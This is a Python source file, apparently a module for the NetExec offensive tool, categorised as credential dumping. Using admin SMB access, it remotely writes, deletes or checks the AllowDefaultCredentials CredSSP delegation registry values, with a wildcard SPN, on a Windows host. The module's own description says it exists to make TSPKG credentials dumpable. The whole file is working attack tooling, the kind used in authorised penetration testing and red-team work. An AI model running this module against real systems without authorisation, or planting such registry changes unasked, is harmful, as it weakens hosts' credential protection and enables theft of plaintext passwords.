from impacket.dcerpc.v5 import rrp
from impacket.dcerpc.v5.rpcrt import DCERPCException

from nxc.helpers.misc import CATEGORY
from nxc.helpers.rpc import NXCRPCConnection


class NXCModule:
    """
    Enable, disable, or check AllowDefaultCredentials to control TSPKG / CredSSP credential delegation
    Module by @E1A
    """

    name = "tspkg"
    description = (
        "Creates, removes or inspects the AllowDefaultCredentials registry entry"
        "to enable or disable TSPKG / CredSSP credential delegation used for credential-dumping"
    )
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        ACTION  Create/Delete the registry key (choices: enable, disable, check)
        Default: check
        """
        if "ACTION" not in module_options or not module_options["ACTION"]:
            context.log.debug("ACTION not specified, defaulting to 'check'")
            self.action = "check"
        else:
            if module_options["ACTION"].lower() not in ["enable", "disable", "check"]:
                context.log.fail("Invalid value for ACTION option! (allowed: enable, disable, check)")
                self.action = None
                return
            self.action = module_options["ACTION"].lower()

    def on_admin_login(self, context, connection):
        if getattr(self, "action", None) is None:
            return
        self._manage_allow_default_credentials(context, connection)

    def _manage_allow_default_credentials(self, context, connection):
        try:
            connection.trigger_winreg()
            with NXCRPCConnection(connection) as rpc_connection:
                dce = rpc_connection.connect(r"\winreg", rrp.MSRPC_UUID_RRP)

                ans = rrp.hOpenLocalMachine(dce)
                hklm = ans["phKey"]

                key_path = "SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation"

                if self.action == "enable":
                    try:
                        ans = rrp.hBaseRegOpenKey(dce, hklm, key_path)
                        key_handle = ans["phkResult"]
                    except DCERPCException:
                        ans = rrp.hBaseRegCreateKey(dce, hklm, key_path)
                        key_handle = ans["phkResult"]

                    # main DWORD to enable delegation
                    rrp.hBaseRegSetValue(dce, key_handle, "AllowDefaultCredentials\x00", rrp.REG_DWORD, 1)
                    rrp.hBaseRegSetValue(dce, key_handle, "ConcatenateDefaults_AllowDefault\x00", rrp.REG_DWORD, 1)

                    # create (or open) subkey and add SPN entry as value "1"
                    try:
                        ans = rrp.hBaseRegOpenKey(dce, key_handle, "AllowDefaultCredentials")
                        subkey_handle = ans["phkResult"]
                    except DCERPCException:
                        ans = rrp.hBaseRegCreateKey(dce, key_handle, "AllowDefaultCredentials")
                        subkey_handle = ans["phkResult"]

                    rrp.hBaseRegSetValue(dce, subkey_handle, "1\x00", rrp.REG_SZ, "*\x00")

                    data = None
                    try:
                        _, data = rrp.hBaseRegQueryValue(dce, key_handle, "AllowDefaultCredentials\x00")
                        val = int(data)
                    except DCERPCException:
                        val = None

                    if val == 1:
                        context.log.success("AllowDefaultCredentials registry DWORD created successfully")
                    else:
                        context.log.fail(f"Unexpected value for AllowDefaultCredentials: {data}")

                elif self.action == "disable":
                    try:
                        ans = rrp.hBaseRegOpenKey(dce, hklm, key_path)
                        key_handle = ans["phkResult"]
                    except DCERPCException:
                        context.log.success("CredentialsDelegation policy not present (nothing to delete)")
                        return

                    # remove SPN entry and subkey if present
                    try:
                        ans = rrp.hBaseRegOpenKey(dce, key_handle, "AllowDefaultCredentials")
                        sub_handle = ans["phkResult"]
                        try:
                            rrp.hBaseRegDeleteValue(dce, sub_handle, "1\x00")
                            context.log.debug("Deleted subkey value '1'")
                        except DCERPCException:
                            context.log.debug("Subkey value '1' not present or already deleted")
                        try:
                            rrp.hBaseRegDeleteKey(dce, key_handle, "AllowDefaultCredentials")
                            context.log.debug("Deleted AllowDefaultCredentials subkey")
                        except DCERPCException:
                            context.log.debug("Could not delete AllowDefaultCredentials subkey (may contain other entries)")
                    except DCERPCException:
                        context.log.debug("AllowDefaultCredentials subkey not present")

                    for valname in ("AllowDefaultCredentials\x00", "ConcatenateDefaults_AllowDefault\x00"):
                        try:
                            rrp.hBaseRegDeleteValue(dce, key_handle, valname)
                            context.log.debug(f"Deleted value {valname}")
                        except DCERPCException:
                            context.log.debug(f"Value {valname} not present")

                    try:
                        rrp.hBaseRegQueryValue(dce, key_handle, "AllowDefaultCredentials\x00")
                        context.log.fail("AllowDefaultCredentials registry value still present after delete attempt")
                    except DCERPCException:
                        context.log.success("AllowDefaultCredentials registry entries deleted (or not present)")

                elif self.action == "check":
                    # Try to open the CredentialsDelegation key if it does not exist, treat as not present
                    try:
                        ans = rrp.hBaseRegOpenKey(dce, hklm, key_path)
                        key_handle = ans["phkResult"]
                    except DCERPCException:
                        context.log.fail("AllowDefaultCredentials registry key not present")
                        return

                    try:
                        _, data = rrp.hBaseRegQueryValue(dce, key_handle, "AllowDefaultCredentials\x00")
                        val = int(data)

                        if val == 1:
                            context.log.success("AllowDefaultCredentials registry key is enabled")
                        else:
                            context.log.fail(f"Unexpected registry value for AllowDefaultCredentials: {data}")
                    except DCERPCException:
                        context.log.fail("AllowDefaultCredentials registry key is disabled (registry key not found)")

                    try:
                        ans = rrp.hBaseRegOpenKey(dce, key_handle, "AllowDefaultCredentials")
                        sub_handle = ans["phkResult"]
                        _, spn = rrp.hBaseRegQueryValue(dce, sub_handle, "1\x00")
                        spn_display = spn.decode() if isinstance(spn, (bytes, bytearray)) else str(spn)
                        context.log.info(f"SPN entry under AllowDefaultCredentials: {spn_display}")
                    except DCERPCException:
                        context.log.debug("No AllowDefaultCredentials subkey or SPN entry present")

        except DCERPCException as e:
            context.log.fail(f"Failed to {self.action} AllowDefaultCredentials: {e}")
